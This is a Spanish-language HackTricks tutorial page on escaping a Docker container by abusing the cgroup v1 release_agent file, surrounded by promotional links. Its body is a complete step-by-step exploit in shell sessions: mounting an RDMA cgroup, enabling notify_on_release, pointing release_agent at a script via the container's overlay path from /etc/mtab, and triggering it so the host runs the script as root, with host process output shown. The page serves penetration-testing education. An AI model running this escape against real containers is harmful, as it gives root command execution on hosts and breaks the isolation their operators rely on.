# Escape de cgroups con release\_agent en Docker

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### Desglosando el concepto de prueba

Para activar este exploit necesitamos un cgroup donde podamos crear un archivo `release_agent` y desencadenar la invocación de `release_agent` matando todos los procesos en el cgroup. La forma más fácil de lograrlo es montar un controlador de cgroup y crear un cgroup hijo.

Para hacerlo, creamos un directorio `/tmp/cgrp`, montamos el controlador de cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) y creamos un cgroup hijo (llamado "x" para los fines de este ejemplo). Aunque no se ha probado cada controlador de cgroup, esta técnica debería funcionar con la mayoría de ellos.

Si estás siguiendo los pasos y obtienes **`mount: /tmp/cgrp: special device cgroup does not exist`**, es porque tu configuración no tiene el controlador de cgroup RDMA. **Cambia `rdma` por `memory` para solucionarlo**. Estamos usando RDMA porque el PoC original solo estaba diseñado para funcionar con él.

Ten en cuenta que los controladores de cgroup son recursos globales que se pueden montar múltiples veces con diferentes permisos y los cambios realizados en un montaje se aplicarán a otro.

Podemos ver la creación del cgroup hijo "x" y el listado de su directorio a continuación.
```shell-session
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
A continuación, **habilitamos las notificaciones de cgroup** al liberar el cgroup “x” **escribiendo un 1** en su archivo `notify_on_release`. También configuramos el agente de liberación de cgroup RDMA para ejecutar un script `/cmd` — que crearemos más tarde en el contenedor — escribiendo la ruta del script `/cmd` en el host en el archivo `release_agent`. Para hacerlo, obtendremos la ruta del contenedor en el host desde el archivo `/etc/mtab`.

Los archivos que agregamos o modificamos en el contenedor están presentes en el host, y es posible modificarlos desde ambos mundos: la ruta en el contenedor y su ruta en el host.

Las operaciones se pueden ver a continuación:
```shell-session
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Tenga en cuenta la ruta al script `/cmd`, que vamos a crear en el host:
```shell-session
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Ahora, creamos el script `/cmd` de tal manera que ejecutará el comando `ps aux` y guardará su salida en `/output` en el contenedor especificando la ruta completa del archivo de salida en el host. Al final, también imprimimos el script `/cmd` para ver su contenido:
```shell-session
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Finalmente, podemos ejecutar el ataque iniciando un proceso que termina inmediatamente dentro del cgroup hijo "x". Al crear un proceso `/bin/sh` y escribir su PID en el archivo `cgroup.procs` en el directorio del cgroup hijo "x", el script en el host se ejecutará después de que `/bin/sh` termine. La salida de `ps aux` realizada en el host se guarda entonces en el archivo `/output` dentro del contenedor:
```shell-session
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
### Referencias

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
